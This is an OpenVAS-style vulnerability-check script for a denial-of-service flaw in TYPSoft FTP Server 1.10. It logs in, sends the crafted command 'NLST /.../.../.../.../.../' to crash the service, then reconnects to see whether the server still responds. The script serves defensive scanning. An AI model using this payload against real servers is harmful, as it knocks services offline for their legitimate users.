if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802605" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_bugtraq_id( 51891 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-02-08 12:12:12 +0530 (Wed, 08 Feb 2012)" );
	script_name( "TYPSoft FTP Server Multiple Commands Remote Denial of Service Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/51891" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/73016" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/18469" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/109508/typsoftcwnslt-dos.txt" );
	script_category( ACT_DENIAL );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/typsoft/detected" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to crash
  the affected application, denying service to legitimate users." );
	script_tag( name: "affected", value: "TYPSoft FTP Server Version 1.10" );
	script_tag( name: "insight", value: "Multiple flaws are caused by an error when processing FTP commands,
  which can be exploited to crash the FTP service by sending specially crafted FTP commands." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running TYPSoft FTP Server and is prone to multiple
  denial of service vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !ContainsString( banner, "TYPSoft FTP Server" )){
	exit( 0 );
}
soc = open_sock_tcp( ftpPort );
if(!soc){
	exit( 0 );
}
kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
login_details = ftp_log_in( socket: soc, user: user, pass: pass );
if(!login_details){
	exit( 0 );
}
exploit = "NLST /.../.../.../.../.../";
ftp_send_cmd( socket: soc, cmd: exploit );
ftp_close( socket: soc );
soc1 = open_sock_tcp( ftpPort );
if(!soc1){
	exit( 0 );
}
banner = recv( socket: soc1, length: 512 );
if(!banner || !ContainsString( banner, "TYPSoft FTP Server" )){
	security_message( ftpPort );
	exit( 0 );
}
ftp_close( socket: soc1 );

